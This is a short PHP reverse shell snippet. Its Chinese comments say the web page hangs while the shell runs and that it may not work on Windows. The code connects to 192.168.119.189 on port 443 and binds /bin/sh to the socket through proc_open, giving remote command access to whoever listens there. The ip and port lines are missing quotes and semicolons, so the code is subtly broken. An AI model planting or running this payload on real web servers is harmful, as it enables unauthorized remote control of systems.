# 反弹shell的时候web页面会卡死，因为php没有异步的函数，默认也不支持多线程，所以卡住这个现象很正常，不影响反弹shell。
# 不过我试了，在windows下似乎不能完美运行。不知道是我环境问题（杀毒软件等）还是代码问题。

<?php
$ip = 192.168.119.189
$port = 443
$sock = fsockopen($ip, $port);
$descriptorspec = array(
        0 => $sock,
        1 => $sock,
        2 => $sock
);
$process = proc_open('/bin/sh', $descriptorspec, $pipes);
proc_close($process);
?>
